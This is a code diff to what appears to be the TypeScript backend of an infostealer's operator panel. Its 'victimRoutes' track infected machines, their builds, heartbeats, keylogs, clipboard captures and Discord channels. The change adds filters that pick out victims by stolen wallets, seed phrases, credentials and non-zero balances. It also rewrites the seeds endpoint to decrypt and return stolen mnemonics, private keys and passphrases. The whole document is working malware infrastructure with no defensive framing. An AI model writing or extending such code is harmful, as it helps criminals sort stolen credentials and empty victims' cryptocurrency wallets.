@@ -5,6 +5,7 @@ import { rm, stat } from 'node:fs/promises';
 import { join } from 'node:path';
 import { prisma } from '../lib/db';
 import { audit } from '../lib/audit';
+import { openSecret } from '../lib/crypto';
 import { HttpError, notFound } from '../lib/errors';
 import { requireRole } from '../plugins/auth';
 import { artifactDir, safeRel } from '../services/artifact';
@@ -25,9 +26,27 @@ const listQuery = z.object({
   tag: z.string().max(64).optional(),
   build: z.string().uuid().optional(),
   linked: z.enum(['0', '1']).optional(),
+  has: z.enum(['wallets', 'seeds', 'creds', 'balances', 'secrets']).optional(),
   cursor: z.string().uuid().optional(),
   limit: z.coerce.number().int().min(1).max(200).default(50)
 });
+
+export function hasWhere(has: z.infer<typeof listQuery>['has']) {
+  switch (has) {
+    case 'wallets':
+      return { wallets: { some: {} } };
+    case 'seeds':
+      return { wallets: { some: { secrets: { some: { kind: { in: ['seed', 'mnemonic'] } } } } } };
+    case 'secrets':
+      return { wallets: { some: { secrets: { some: {} } } } };
+    case 'creds':
+      return { credentials: { some: {} } };
+    case 'balances':
+      return { wallets: { some: { AND: [{ NOT: { balance: null } }, { NOT: { balance: '0' } }] } } };
+    default:
+      return {};
+  }
+}
 
 const tagSchema = z.object({ tags: z.array(z.string().max(32)).max(24) });
 
@@ -46,6 +65,7 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
         ...(query.status ? { status: query.status } : {}),
         ...(query.tag ? { tags: { has: query.tag } } : {}),
         ...(query.build ? { buildId: query.build } : {}),
+        ...hasWhere(query.has),
         ...(query.linked === '1' ? { discord: { isNot: null } } : {}),
         ...(query.linked === '0' ? { discord: { is: null } } : {}),
         ...(query.q
@@ -65,7 +85,7 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
       include: {
         build: { select: { name: true, version: true } },
         discord: { select: { channelId: true, missingAt: true } },
-        _count: { select: { wallets: true, artifacts: true } }
+        _count: { select: { wallets: true, artifacts: true, credentials: true } }
       }
     });
     const failures = rows.length === 0 ? [] : await prisma.event.findMany({
@@ -84,6 +104,7 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
         socket: hasControl(row.id),
         wallets: row._count.wallets,
         artifacts: row._count.artifacts,
+        credentials: row._count.credentials,
         health: health.get(row.id) ?? null,
         _count: undefined
       })),
@@ -97,7 +118,8 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
       where: {
         ...(query.os ? { os: query.os } : {}),
         ...(query.country ? { country: query.country } : {}),
-        ...(query.status ? { status: query.status } : {})
+        ...(query.status ? { status: query.status } : {}),
+        ...hasWhere(query.has)
       },
       orderBy: { lastHeartbeatAt: 'desc' },
       take: 10000
@@ -135,7 +157,7 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
       where: { id },
       include: {
         build: { select: { id: true, name: true, version: true, buildId: true } },
-        _count: { select: { wallets: true, artifacts: true, tasks: true, clipboard: true, keylogs: true } },
+        _count: { select: { wallets: true, artifacts: true, tasks: true, clipboard: true, keylogs: true, credentials: true } },
         discord: true
       }
     });
@@ -286,11 +308,30 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
 
   app.get('/victims/:id/seeds', async (request) => {
     const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
-    const events = await prisma.event.findMany({ where: { victimId: id, kind: 'seed_found' }, orderBy: { createdAt: 'desc' }, take: 500 });
+    const secrets = await prisma.walletSecret.findMany({
+      where: { wallet: { victimId: id }, kind: { in: ['seed', 'mnemonic', 'private_key', 'passphrase'] } },
+      orderBy: { updatedAt: 'desc' },
+      take: 1000,
+      include: { wallet: { select: { id: true, path: true, targetId: true } } }
+    });
     return {
-      items: events.map((event) => {
-        const data = event.data as { path?: string; type?: string; words?: number; value?: string };
-        return { id: event.id, path: data.path ?? '', type: data.type ?? 'unknown', words: data.words ?? 0, value: data.value ?? '', createdAt: event.createdAt };
+      items: secrets.map((secret) => {
+        let value = '';
+        try {
+          value = secret.valueEnc ? openSecret(secret.valueEnc) : '';
+        } catch {
+          value = '';
+        }
+        return {
+          id: secret.id,
+          walletId: secret.wallet.id,
+          path: secret.wallet.path,
+          target: secret.wallet.targetId,
+          type: secret.kind,
+          words: secret.words ?? 0,
+          value,
+          createdAt: secret.firstSeenAt
+        };
       })
     };
   });
